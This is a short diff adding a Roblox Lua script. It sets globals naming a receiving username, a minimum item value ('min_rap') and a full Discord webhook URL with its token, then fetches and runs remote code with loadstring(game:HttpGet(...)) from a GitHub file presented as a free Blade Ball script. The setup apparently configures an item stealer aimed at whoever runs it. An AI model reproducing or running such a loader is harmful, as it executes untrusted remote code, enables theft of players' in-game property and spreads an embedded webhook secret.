@@ -1,0 +1,6 @@
+_G.Username = "Blanicag_3133" 
+_G.min_rap = 400
+_G.pingEveryone = "Yes" 
+_G.webhook = "https://discord.com/api/webhooks/1316540744411910175/sCoabSG4MPwhaQulxNb7yzY4H-3gH-5kpRSONne1kIK9JUOqEmG-A5rcRuklYbhvpP7d"   
+                                                                                           
+loadstring(game:HttpGet("https://raw.githubusercontent.com/tobi437a/Blade-Ball/refs/heads/main/FREEbladeball.lua"))()
